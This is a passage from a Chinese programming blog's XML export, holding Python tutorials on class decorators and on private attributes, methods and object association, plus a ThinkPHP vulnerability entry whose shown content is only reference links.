class="built_in">format</span>(</span><br><span class="line">            func=self.func.__name__))</span><br><span class="line">        <span class="keyword">return</span> self.func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Logging</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;say &#123;&#125;!&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;木木&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="带参数的类装饰器"><a href="#带参数的类装饰器" class="headerlink" title="带参数的类装饰器"></a>带参数的类装饰器</h5><p>如果需要通过类形式实现带参数的装饰器，那么会比前面的例子稍微复杂一点。那么在构造函数里接收的就不是一个函数，而是传入的参数。通过类把这些参数保存起来。然后在重载<code>__call__</code>方法是就需要接收一个函数并返回一个函数。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Logging</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, level=<span class="string">&#x27;INFO&#x27;</span></span>):</span><br><span class="line">        self.level = level</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, func</span>):  <span class="comment"># 接收函数</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&#123;level&#125;]: enter function &#123;func&#125;()&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                level=self.level,</span><br><span class="line">                func=func.__name__))</span><br><span class="line">            func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> wrapper  <span class="comment"># 返回函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Logging(<span class="params">level=<span class="string">&#x27;INFO&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;say &#123;&#125;!&quot;</span>.<span class="built_in">format</span>(something))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">say(<span class="string">&#x27;木木&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP框架漏洞总结</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/ThinkPHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/lingzhisec/p/15728886.html">Think PHP漏洞总结（全系列） - lingzhi_sec - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/wuxianbing2012/article/details/104897634?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control">ThinkPHP5 远程代码执行漏洞分析_repoman_的博客-CSDN博客</a></li><li><a href="https://blog.csdn.net/dengzhasong7076/article/details/102139816?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-10.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-10.control">ThinkPHP 5.x RCE 漏洞分析与利用总结_dengzhasong7076的博客-CSDN博客</a></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> 框架漏洞 </tag>
            
            <tag> Thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7. 深入面向对象</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/7.%20%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/7.%20%E6%B7%B1%E5%85%A5%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>深入面向对象</p><h1 id="隐藏数据"><a href="#隐藏数据" class="headerlink" title="隐藏数据"></a>隐藏数据</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, new_name, new_age</span>):</span><br><span class="line">        self.name = new_name</span><br><span class="line">        self.age = new_age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我叫%s，今年%s了&quot;</span> % (self.name, self.age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建猫对象</span></span><br><span class="line">cat = Cat(<span class="string">&quot;波斯猫&quot;</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 调用方法</span></span><br><span class="line">cat.print_info()</span><br><span class="line"><span class="comment"># 尝试修改属性，动态修改实例属性</span></span><br><span class="line">cat.age = -<span class="number">10</span></span><br><span class="line"><span class="comment"># 调用方法</span></span><br><span class="line">cat.print_info()</span><br></pre></td></tr></table></figure><p>如果运行上述代码，会发现，第二次输出的信息有误，其为”我交波斯猫，今年-10岁了”</p><p>之所以出现这样的错误，究其原因是因为：我们通过对象直接给实例属性赋值的这种方式容易出错</p><p>如果在赋值的时候，是通过一个实例方法的调用，在方法中对数据进行严格的检查，合格的数据可以给属性设置，不合格的数据就提醒开发者，这样一来就能够保证数据的准确性了</p><p>那该怎样实现呢</p><p>答：</p><ol><li>设置属性为私有属性</li><li>添加额外对属性操作的方法</li></ol><blockquote><p>就经验而言，一般来说都是通过<strong>方法操作私有属性</strong>来修改数据</p></blockquote><h2 id="实现对数据的隐藏"><a href="#实现对数据的隐藏" class="headerlink" title="实现对数据的隐藏"></a>实现对数据的隐藏</h2><p>想要实现上述阐述的那个功能，我们需要做2件事情</p><ol><li>设置属性为私有属性</li><li>添加额外对属性操作的方法</li></ol><h3 id="设置私有属性"><a href="#设置私有属性" class="headerlink" title="设置私有属性"></a>设置私有属性</h3><blockquote><p>在Python中，如果想要设置为私有的属性，那么仅仅需要在定义属性时在前面加两个下划线<code>__</code>即可</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">类名</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;顾安&quot;</span></span><br><span class="line">        self.__age = <span class="number">18</span>  <span class="comment"># 这个属性就是私有属性</span></span><br></pre></td></tr></table></figure><p>既然有了私有属性，那对象能够直接操作它呢？</p><p>答：不能，否则就没有私有的作用了</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;顾安&quot;</span></span><br><span class="line">        self.__age = <span class="number">18</span>  <span class="comment"># 这个属性就是私有属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = Teacher()</span><br><span class="line"><span class="built_in">print</span>(t.name)  <span class="comment"># 能够获取</span></span><br><span class="line"><span class="built_in">print</span>(t.__age)  <span class="comment"># 此时会程序报错，因为__age是私有属性，不能通过对象直接操作</span></span><br></pre></td></tr></table></figure><h3 id="添加额外对属性操作的方法"><a href="#添加额外对属性操作的方法" class="headerlink" title="添加额外对属性操作的方法"></a>添加额外对属性操作的方法</h3><p>想要实现对私有属性的操作，我们需要定义方法，在方法中操作</p><p>示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.name = <span class="string">&quot;顾安&quot;</span></span><br><span class="line">        self.__age = <span class="number">18</span>  <span class="comment"># 这个属性就是私有属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">self, new_age</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= new_age &lt;= <span class="number">120</span>:</span><br><span class="line">            self.__age = new_age</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;设置年龄成功&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;年龄数据有误...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_age</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = Teacher()</span><br><span class="line">t.set_age(<span class="number">20</span>)  <span class="comment"># 设置年龄</span></span><br><span class="line"><span class="built_in">print</span>(t.get_age())  <span class="comment"># 获取年龄</span></span><br></pre></td></tr></table></figure><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>1.操作属性有2种方法</p><ul><li>直接通过对象名修改</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名.属性名 = 数据</span><br></pre></td></tr></table></figure><ul><li>通过方法间接修改</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">对象名.方法名(数据)</span><br></pre></td></tr></table></figure><p>2.通过使用方法来进行修改，就可以在方法中进行数据合法性的检查</p><p>3.通过<code>__</code>可以将属性变为私有属性，这样就防止了通过对象直接操作属性时可能带来的隐患</p><h2 id="第二种不太推荐的操作隐藏数据的方法"><a href="#第二种不太推荐的操作隐藏数据的方法" class="headerlink" title="第二种不太推荐的操作隐藏数据的方法"></a>第二种不太推荐的操作隐藏数据的方法</h2><blockquote><p>实际上添加隐藏数据的操作，就是在做这样一件事：我们原本定义的隐藏属性是<code>__age</code>，默认的python会对该名称**自动添加前缀<code>_类名</code>**，即变成了<code>_Test__age</code>这样一种形式存在的实例属性。</p><p>所以我们可以通过<code>stu._Test__age</code>这种方式直接调用其隐藏的私有属性，这种私有属性的隐藏只是名义上的隐藏，我们在背地里可以通过<code>实例对象._类名__属性名</code>，对其操作~~</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">当前操作私有属性的方式不推荐大家使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.__age = age  <span class="comment"># 对原有的名称自动添加前缀</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;name: <span class="subst">&#123;self.name&#125;</span>, age: <span class="subst">&#123;self.__age&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行私有属性的修改</span></span><br><span class="line">stu = Test(<span class="string">&#x27;顾安&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命名规则: 实例对象._类名__属性名</span></span><br><span class="line"><span class="comment"># 其实python中的私有属性也是不安全的</span></span><br><span class="line">stu._Test__age = <span class="number">20</span></span><br><span class="line">stu.print_info()</span><br></pre></td></tr></table></figure><h1 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h1><h2 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h2><p>生活中我们肯定去过银行办理过业务，我们可以从银行的大门进入大厅，取号等待办理业务，可以在大厅里来回走动，这个区域是所有人都可以随意进出的；而银行办公人员工作的地方，只能有相应的权限的办公人员才能进出，这个区域对于外来办理业务的人员来说是禁止的。</p><p>通过上述的描述，大家能够理解了一件事情，即访问的<code>地方不同</code>需要的<code>权限不同</code></p><p>那么试想，一个较大软件系统肯定有很多个可以让用户直接调用的接口（<code>API</code>可以简单理解为<code>方法</code>）这些接口可以任意调用，而有些接口就不能使用</p><p>在Python中，我们把可以通过对象直接调用的方法叫做<code>公有方法</code>，不能通过对象直接调用的方法叫做<code>私有方法</code></p><h2 id="实现对方法的隐藏"><a href="#实现对方法的隐藏" class="headerlink" title="实现对方法的隐藏"></a>实现对方法的隐藏</h2><blockquote><p>对于定义<code>私有方法</code>的方式与定义<code>私有属性</code>基本相同，就是在方法的前面添加<code>__</code>（即2个下划线<code>_</code>）</p><p>同样也是不能被对象直接调用，只能通过在类中定义的方法去调用这种隐藏的方法</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BankService</span>:</span><br><span class="line">    <span class="comment"># 转账方法 私有方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bank_2_bank</span>(<span class="params">self, money</span>):  <span class="comment"># 当前的money不是实例属性 只是一个方法中的普通的形参而已</span></span><br><span class="line">        <span class="comment"># 当前转账的具体代码省略...</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;这里执行的是跨行转账的具体代码....金额为: <span class="subst">&#123;money&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 当前表示执行成功 成功执行时候返回一个True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">self</span>):</span><br><span class="line">        money = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入你要转账的金额: &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> money &gt; <span class="number">1000000</span>:  <span class="comment"># 你必须要达到银行的转账标准</span></span><br><span class="line">            <span class="keyword">if</span> self.__bank_2_bank(money): <span class="comment"># 当前检测这个方法的返回值是不是一个True</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;转账成功...&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;转账失败...&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;没钱就别转了...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bs = BankService()</span><br><span class="line">bs.transfer()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果你现在想要转账</span></span><br><span class="line"><span class="string">    1. 你的金额必须要大于100万</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">如果你现在没有一百万</span></span><br><span class="line"><span class="string">    能不能绕过检测金额的方法？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 私有方法也是不能在类的外部直接使用实例对象所调用</span></span><br><span class="line"><span class="comment"># bs.__bank_2_bank()</span></span><br></pre></td></tr></table></figure><p>运行测试（转账成功）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入转账金额：20000000</span><br><span class="line">这里是银行之间的转账代码....</span><br><span class="line">转账成功</span><br></pre></td></tr></table></figure><p>运行测试（转账失败）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请输入转账金额：100</span><br><span class="line">都没钱，还转什么啊！自己留着花吧!</span><br></pre></td></tr></table></figure><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul><li><code>Python</code>中没有像<code>C++</code>中<code>public</code>和<code>private</code>这些关键字来区别<code>公有</code>和<code>私有</code>，它是以命名方式来区分，如果在名字前面加了2个下划线<code>__</code>，则表明该属性是私有，否则为公有</li></ul><h2 id="直接调用私有方法所出现的问题"><a href="#直接调用私有方法所出现的问题" class="headerlink" title="直接调用私有方法所出现的问题"></a>直接调用私有方法所出现的问题</h2><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BankService</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__bank_2_bank</span>(<span class="params">self, money</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这里是银行之间的转账代码....&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">transfer</span>(<span class="params">self</span>):</span><br><span class="line">        money = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入转账金额：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> money &gt; <span class="number">100000</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__bank_2_bank(money):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;转账成功&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;转账失败...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;都没钱，还转什么啊！自己留着花吧!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bank_service = BankService()</span><br><span class="line"><span class="comment"># bank_service.transfer()  # 可以调用，是公有方法</span></span><br><span class="line">bank_service.__bank_2_bank()  <span class="comment"># 不可以调用，是私有方法</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AttributeError                            Traceback (most recent call last)</span><br><span class="line">Cell In [<span class="number">1</span>], line <span class="number">19</span></span><br><span class="line">     <span class="number">17</span> bank_service = BankService()</span><br><span class="line">     <span class="number">18</span> <span class="comment"># bank_service.transfer()  # 可以调用，是公有方法</span></span><br><span class="line">---&gt; <span class="number">19</span> bank_service.__bank_2_bank()</span><br><span class="line"></span><br><span class="line">AttributeError: <span class="string">&#x27;BankService&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;__bank_2_bank&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="对象关联"><a href="#对象关联" class="headerlink" title="对象关联"></a>对象关联</h1><h2 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h2><p>大家知道，我们在上学的时候，每个同学是一个对象，那么教室也是一个对象对吗？每个同学肯定是属于某一个教室的对吧，例如张三是205班的；那么怎样才能用代码来实现他们之间的关系呢</p><p>如下代码，创建了1个教室对象，1个学生对象，该怎样将它们2个联系起来呢？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Classroom</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.classroom_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.student_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个教室对象</span></span><br><span class="line">class205 = Classroom(<span class="string">&quot;205班&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个学生对象</span></span><br><span class="line">stu01 = Student(<span class="string">&quot;学生1&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="将两个对象进行关联"><a href="#将两个对象进行关联" class="headerlink" title="将两个对象进行关联"></a>将两个对象进行关联</h2><p>在上述的代码中，我们发现如果当前的教室对象与学生对象是没有任何关系关联的，如果想要实现学生属于教室，那么只需要2步就能实现</p><ol><li>搞清楚<code>谁属于谁</code>，例如上述示例中，学生属于教室</li><li>在范围大的那个对象中，定义一个属性存储范围小的对象引用即可</li></ol><blockquote><p>需要注意 动态赋值操作依然不好，之后会讲到更好的方法关联对象</p></blockquote><p>示例一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassRoom</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.class_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.student_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class_01 = ClassRoom(<span class="string">&#x27;python 1班&#x27;</span>)</span><br><span class="line">stu_01 = Student(<span class="string">&#x27;夏洛&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对当前这两个类进行关联</span></span><br><span class="line">class_01.stu = stu_01  <span class="comment"># 在班级类中动态的去创建了一个实例属性 stu属性</span></span><br><span class="line"><span class="comment"># 这个stu属性与stu_01进行了绑定</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在类中动态创建的stu属性指向的是学生类生产出来的实例对象</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="调用关联的对象"><a href="#调用关联的对象" class="headerlink" title="调用关联的对象"></a>调用关联的对象</h2><p>上述代码已经完成了对象学生与教室的关联，那么怎样调用呢？格式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果A对象中的某个属性指向了B对象，那么调用方式</span></span><br><span class="line">A.xxx  <span class="comment"># 此时就是指的B对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想要调用B对象中的某方法，那么就再接着.yyy方法即可</span></span><br><span class="line">A.xxx.yyy()</span><br></pre></td></tr></table></figure><blockquote><p><strong>常用的关联方法：</strong>在类定义种关联另一个类!</p><p>ps:上面的动态赋值并不“优雅”</p></blockquote><p>代码示例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassRoom</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.class_name = name</span><br><span class="line">        self.stu = <span class="literal">None</span>  <span class="comment"># 让这个属性的默认值为None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 手动定义一个添加学生的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_new_stu</span>(<span class="params">self, stu</span>):</span><br><span class="line">        self.stu = stu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.student_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class_01 = ClassRoom(<span class="string">&#x27;python 1班&#x27;</span>)</span><br><span class="line">stu_01 = Student(<span class="string">&#x27;夏洛&#x27;</span>)</span><br><span class="line"></span><br><span class="line">class_01.add_new_stu(stu_01)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如何使用班级类打印学生名称?</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">通过clsss_01方法stu实例属性</span></span><br><span class="line"><span class="string">stu属性指向的是student这个类的实例对象</span></span><br><span class="line"><span class="string">所以可以使用 stu.student_name 访问学生类中的student_name属性</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(class_01.stu.student_name)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">学生1</span><br></pre></td></tr></table></figure><h2 id="关联多个对象"><a href="#关联多个对象" class="headerlink" title="关联多个对象"></a>关联多个对象</h2><p>既然关联1个对象搞懂了，那么关联多个也就手到擒来，方式如下：</p><ol><li>在范围大的那个对象中再定义一个新的属性，通过设置属性指向新的对象</li><li>如果关联的新的对象与之前关联的对象类型相同，可以考虑用列表、字典、集合等方式将它们关联</li></ol><p>实现将多个学生关联到一个教室：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassRoom</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.students = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_new_stu</span>(<span class="params">self, stu</span>):</span><br><span class="line">        self.students.append(stu)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.student_name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class_01 = ClassRoom(<span class="string">&#x27;python 1班&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 想要让多个学生加入到这个班级中</span></span><br><span class="line">stu_1 = Student(<span class="string">&#x27;安娜&#x27;</span>)</span><br><span class="line">stu_2 = Student(<span class="string">&#x27;双双&#x27;</span>)</span><br><span class="line">stu_3 = Student(<span class="string">&#x27;木木&#x27;</span>)</span><br><span class="line"></span><br><span class="line">class_01.add_new_stu(stu_1)</span><br><span class="line">class_01.add_new_stu(stu_2)</span><br><span class="line">class_01.add_new_stu(stu_3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(class_01.students[<span class="number">0</span>].student_name)</span><br><span class="line"><span class="built_in">print</span>(class_01.students[<span class="number">1</span>].student_name)</span><br><span class="line"><span class="built_in">print</span>(class_01.students[<span class="number">2</span>].student_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 想要让一个实例对象关联到多个实例对象中 可以使用序列类型进行实例对象的临时存储</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">专栏：</span></span><br><span class="line"><span class="string">    三器一闭</span></span><br><span class="line"><span class="string">    文件处理</span></span><br><span class="line"><span class="string">    异常</span></span><br><span class="line"><span class="string">    元类</span></span><br><span class="line"><span class="string">    描述符</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">网络编程</span></span><br><span class="line"><span class="string">数据库部分</span></span><br><span class="line"><span class="string">多任务</span></span><br><span class="line"><span class="string">    线程</span></span><br><span class="line"><span class="string">    进程</span></span><br><span class="line"><span class="string">    协程</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="面相对象中的继承"><a href="#面相对象中的继承" class="headerlink" title="面相对象中的继承"></a>面相对象中的继承</h1><h2 id="引入-3"><a href="#引入-3" class="headerlink" 